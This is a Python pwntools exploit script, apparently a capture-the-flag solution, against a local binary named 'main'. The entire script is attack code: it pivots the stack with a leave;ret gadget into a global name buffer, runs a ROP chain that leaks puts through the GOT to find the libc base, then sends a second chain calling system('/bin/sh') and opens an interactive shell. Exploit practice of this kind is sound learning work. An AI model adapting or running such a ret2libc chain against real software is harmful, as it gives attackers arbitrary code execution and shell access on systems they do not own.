from pwn import *

p = process("./main")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elf = ELF("./main")

rdi = 0x00000000004007a3
rsi = 0x00000000004007a1
rbp = 0x00000000004005e0
rsp_3 = 0x000000000040079d
leave_ret = 0x0000000000400733

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
gdb.attach(p,"b *0x400734")

name_addr = 0x601080 + 0x200
payload1 = p64(rsp_3) + p64(name_addr)
payload1 = payload1.ljust(0x200)
payload1 += p64(0) * 3 + p64(rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(rdi) + p64(0) + p64(rsi) + p64(name_addr + 0x100) + p64(0) + p64(elf.plt["read"])
payload1 += p64(rsp_3) + p64(name_addr + 0x100)
name_addr = 0x601080
payload2 = "a" * 0x40 + p64(name_addr - 8) + p64(leave_ret)
p.sendafter("Input Your Name:\n",payload1)
p.sendafter("Input Buffer:\n",payload2)
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload3 = p64(0) * 3 + p64(rdi) + p64(binsh) + p64(system)
p.send(payload3)
p.interactive()
